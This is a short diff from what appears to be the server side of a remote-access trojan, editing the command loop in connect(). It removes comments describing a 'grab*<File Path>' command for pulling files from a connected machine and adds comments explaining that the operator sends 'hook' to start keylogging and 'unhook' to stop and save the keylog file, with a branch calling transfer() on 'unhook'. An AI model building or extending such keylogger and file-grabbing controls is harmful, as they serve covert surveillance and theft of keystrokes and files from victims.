@@ -48,11 +48,9 @@ def connect():
             break
 
 
-# if we received grab keyword from the user input, then this is an indicator for
-# file transfer operation, hence we will call transfer function
-            
-# Remember the Formula is  grab*<File Path>
-# Example:  grab*C:\Users\Hussam\Desktop\photo.jpeg
+# From the server side, after connection has been established, senf 'hook' to start key logging, 
+#and unhook to stop logging and save keylogg file at desktop.
+
 
         elif 'unhook' in command: 
             transfer(conn,command)
